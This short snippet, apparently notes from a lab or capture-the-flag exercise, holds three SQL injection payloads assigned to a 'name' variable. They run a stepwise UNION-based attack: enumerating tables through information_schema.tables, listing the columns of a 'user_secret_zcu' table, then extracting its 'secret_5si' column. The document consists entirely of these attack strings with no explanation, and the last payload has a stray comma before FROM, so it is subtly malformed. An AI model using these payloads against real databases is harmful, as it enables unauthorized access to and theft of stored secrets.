# information_schema.tables : table_name, columns

name = """' or true 
        union 
        select '1', '2', table_name, '4', '5'
        from information_schema.tables
        ; --"""

# Then

name = """' or true union  select 'b2ed652a-71a0-11ee-b962-0242ac120002', '2', column_name, '4' from information_schema.columns where table_name = 'user_secret_zcu'; --"""


"""' or true union select 'b465c028-71a0-11ee-b962-0242ac120002', '1', '2', secret_5si, from user_secret_zcu; --"""